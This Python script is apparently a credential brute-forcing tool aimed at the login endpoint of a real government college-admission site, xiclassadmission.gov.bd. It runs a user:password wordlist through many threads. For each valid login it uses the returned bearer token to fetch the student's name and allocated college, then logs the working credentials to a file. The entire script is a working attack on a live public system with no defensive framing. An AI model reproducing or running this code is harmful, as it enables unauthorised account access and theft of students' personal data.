import requests
from concurrent import futures
from colorama import Fore
import threading

def check_login(user, passwd):
    headers = {
    'Accept': '*/*',
    'Accept-Encoding': 'gzip, deflate, br, zstd',
    'Accept-Language': 'en-GB,en;q=0.6',
    'Connection': 'keep-alive',
    'Content-Type': 'application/json',
    'Host': 'xiclassadmission.gov.bd',
    'Origin': 'https://xiclassadmission.gov.bd',
    'Referer': 'https://xiclassadmission.gov.bd/login-new',
    'Sec-Ch-Ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Brave";v="126"',
    'Sec-Ch-Ua-Mobile': '?0',
    'Sec-Ch-Ua-Platform': '"Windows"',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Gpc': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
}
    response = requests.post(
        url = 'https://xiclassadmission.gov.bd/auth/signIn',
        data = '{"password":"'+passwd+'","crvsId":"'+user+'"}',
        headers = headers
    )

    if response.status_code == 200 and response.json()["message"] == 'Success':
        bearer = response.json()["result"]
        response2 = requests.get(
            'https://xiclassadmission.gov.bd/students/getAllocationDetails',
            headers = {
                'Accept': '*/*',
                'Accept-Encoding': 'gzip, deflate, br, zstd',
                'Accept-Language': 'en-GB,en;q=0.6',
                'Connection': 'keep-alive',
                'Host': 'xiclassadmission.gov.bd',
                'Referer': 'https://xiclassadmission.gov.bd/login-new',
                'Sec-Ch-Ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Brave";v="126"',
                'Sec-Ch-Ua-Mobile': '?0',
                'Sec-Ch-Ua-Platform': '"Windows"',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Gpc': '1',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/',
                'Authorization': 'Bearer '+bearer 
            }
        )
        try:
            experimental = f'[+] Student -> {response2.json()["result"][0]["studentName"]}\n[+] College -> {response2.json()["result"][0]["collegeName"]}'
        except:
            experimental = '[+] Info -> Student was not allocated to any college!'
        print(
            f'\n{Fore.GREEN}[+] Credentials -> {user}:{passwd}\n[+] Status -> {response.status_code} (Valid Credentials)\n[+] Response -> {response.json()["message"]}\n{experimental}{Fore.RESET}\n'
        )
        open('Login_SUCCESS.txt', 'a').write(f'\n\n[+] Credentials -> {user}:{passwd}\n[+] Status -> {response.status_code} (Valid Credentials)\n[+] Response -> {response.json()["message"]}\n{experimental}\n\n')
        return 1
    elif response.status_code == 200 and response.json()["message"] == 'Username and/or password mismatch':
        print(
            f'\n{Fore.RED}[+] Credentials -> {user}:{passwd}\n[+] Status -> {response.status_code} (Invalid Credentials)\n[+] Response -> {response.json()["message"]}{Fore.RESET}\n'
        )
    else:
        print(
            f'\n{Fore.RED}[+] Credentials -> {user}:{passwd}\n[+] Status -> {response.status_code} (Invalid Credentials)\n[+] Response -> {response.json()["message"]}{Fore.RESET}\n'
        )
    return 0

checked = 0
hits = 0
waste = 0
lock = threading.Lock()

def process(data):
    global checked, hits, waste
    print(f'Total -> {checked} | Hits -> {hits} | Waste -> {waste}', end='\r')
    user, passwd = data.strip().split(':')
    resp = check_login(user, passwd)
    
    with lock:
        checked += 1
        if resp == 1:
            hits += 1
        else:
            waste += 1

print(f'{Fore.BLUE}\n[*] XICLASSADMISSION.GOV.BD BruteForce\n[*] Author -> Junaid Rahman\n[*] Github -> https://github.com/Junaid433\n{Fore.RESET}')
file = input(f'[+] Enter the Wordlist: ')
workers = int(input('[+] Enter the number of workers: '))
print('\n\n')
with open(file, 'r') as f:
    data = f.readlines()
with futures.ThreadPoolExecutor(max_workers=workers) as executor:
    executor.map(process, data)